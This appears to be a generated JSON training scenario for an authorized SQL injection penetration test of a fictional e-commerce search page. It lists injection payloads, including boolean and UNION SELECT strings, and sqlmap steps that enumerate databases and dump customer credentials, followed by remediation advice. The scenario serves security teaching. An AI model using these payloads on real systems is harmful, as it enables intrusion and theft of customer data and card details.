@@ -1,0 +1,119 @@
+{
+  "title": "E-commerce Application SQL Injection Discovery and Exploitation",
+  "description": "Authorized penetration test of e-commerce web application reveals SQL injection vulnerability in product search parameter. Complete exploitation from detection to data extraction.",
+  "difficulty": "intermediate",
+  "scenario": "ShopCorp hired your firm to perform security assessment of their e-commerce platform. Initial reconnaissance identified potential SQL injection in the product search functionality. Your objective is to confirm the vulnerability, extract database structure, and demonstrate impact by retrieving customer data.",
+  "steps": [
+    {
+      "step_number": 1,
+      "tool": "manual_sql_injection_testing",
+      "action": "Test for SQL injection by injecting single quote in search parameter",
+      "parameters": {
+        "target_url": "https://shop.example.com/search.php",
+        "payload": "id=1'"
+      },
+      "expected_result": "MySQL syntax error displayed: 'You have an error in your SQL syntax near ''1''' - confirms SQL injection vulnerability",
+      "explanation": "Error-based detection is quickest way to identify SQL injection - database error messages leak valuable information"
+    },
+    {
+      "step_number": 2,
+      "tool": "manual_sql_injection_testing",
+      "action": "Confirm boolean-based blind injection by testing true/false conditions",
+      "parameters": {
+        "target_url": "https://shop.example.com/search.php",
+        "payload": "id=1 OR 1=1--"
+      },
+      "expected_result": "Payload '1 OR 1=1--' returns 2847 lines (all products), payload '1 AND 1=2--' returns 0 lines - boolean injection confirmed",
+      "explanation": "Boolean-based testing confirms vulnerability works even if error messages are suppressed"
+    },
+    {
+      "step_number": 3,
+      "tool": "sqlmap_basic_injection",
+      "action": "Run automated sqlmap scan to identify vulnerability and database type",
+      "parameters": {
+        "target_url": "https://shop.example.com/search.php?id=1"
+      },
+      "expected_result": "Sqlmap identifies MySQL 5.7.33, confirms GET parameter 'id' is injectable using error-based technique, web server: Apache 2.4.41 on Ubuntu Linux",
+      "explanation": "Automated scanning saves time and provides comprehensive vulnerability fingerprinting"
+    },
+    {
+      "step_number": 4,
+      "tool": "sqlmap_basic_injection",
+      "action": "Enumerate all databases accessible through the injection point",
+      "parameters": {
+        "target_url": "https://shop.example.com/search.php?id=1"
+      },
+      "expected_result": "Found 5 databases: information_schema, mysql, performance_schema, shopcorp_db, analytics_db",
+      "explanation": "Database enumeration reveals scope of access - shopcorp_db likely contains customer data"
+    },
+    {
+      "step_number": 5,
+      "tool": "sqlmap_basic_injection",
+      "action": "Extract table names from main application database",
+      "parameters": {
+        "target_url": "https://shop.example.com/search.php?id=1",
+        "database": "shopcorp_db"
+      },
+      "expected_result": "7 tables discovered: users, customers, orders, products, payments, shipping_addresses, credit_cards",
+      "explanation": "Table enumeration identifies sensitive data storage locations - credit_cards table is critical finding"
+    },
+    {
+      "step_number": 6,
+      "tool": "sqlmap_basic_injection",
+      "action": "Extract column structure from customers table",
+      "parameters": {
+        "target_url": "https://shop.example.com/search.php?id=1",
+        "database": "shopcorp_db",
+        "table": "customers"
+      },
+      "expected_result": "Columns found: id, first_name, last_name, email, phone, password_hash, address, created_at, loyalty_points",
+      "explanation": "Column enumeration reveals personal data fields including password hashes"
+    },
+    {
+      "step_number": 7,
+      "tool": "sqlmap_basic_injection",
+      "action": "Dump customer records including credentials",
+      "parameters": {
+        "target_url": "https://shop.example.com/search.php?id=1",
+        "database": "shopcorp_db",
+        "table": "customers",
+        "columns": "email,password_hash,first_name,last_name"
+      },
+      "expected_result": "Extracted 1,247 customer records with MD5 password hashes - sqlmap auto-cracked 423 weak passwords including 'password123', '123456', 'shopcorp2024'",
+      "explanation": "Data extraction demonstrates full compromise - customer PII and credentials exposed"
+    },
+    {
+      "step_number": 8,
+      "tool": "manual_sql_injection_testing",
+      "action": "Use UNION-based injection to extract credit card table structure",
+      "parameters": {
+        "target_url": "https://shop.example.com/search.php",
+        "payload": "id=1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='credit_cards'--"
+      },
+      "expected_result": "Credit card table columns: id, customer_id, card_number, expiry_date, cvv, card_holder_name - CRITICAL: credit cards stored unencrypted!",
+      "explanation": "Manual techniques useful for targeted extraction - reveals severe PCI DSS compliance violation"
+    }
+  ],
+  "outcome": "Successfully demonstrated critical SQL injection vulnerability in e-commerce platform. Extracted 1,247 customer records including emails, names, addresses, and 423 cracked passwords. Discovered unencrypted credit card storage affecting potentially thousands of customers. Impact: Complete data breach, PCI DSS non-compliance, customer credential exposure. Recommendations: Immediate mitigation using parameterized queries, implement prepared statements, encrypt credit card data, enforce input validation, conduct code review of all database queries, implement WAF, notify affected customers per breach notification laws.",
+  "learning_objectives": [
+    "Identify SQL injection using error-based detection",
+    "Confirm vulnerabilities with boolean-based testing",
+    "Use sqlmap for automated exploitation and enumeration",
+    "Extract database structure systematically (databases → tables → columns → data)",
+    "Combine automated and manual techniques for comprehensive testing",
+    "Understand business impact of SQL injection on e-commerce platforms",
+    "Provide actionable remediation guidance"
+  ],
+  "metadata": {
+    "created_by": "neural_mesh_v5.2_generator",
+    "category": "pentesting",
+    "subcategory": "sql_injection",
+    "tools_used": [
+      "manual_sql_injection_testing",
+      "sqlmap_basic_injection"
+    ],
+    "estimated_time": "45-60 minutes",
+    "authorization_required": true,
+    "severity": "critical"
+  }
+}
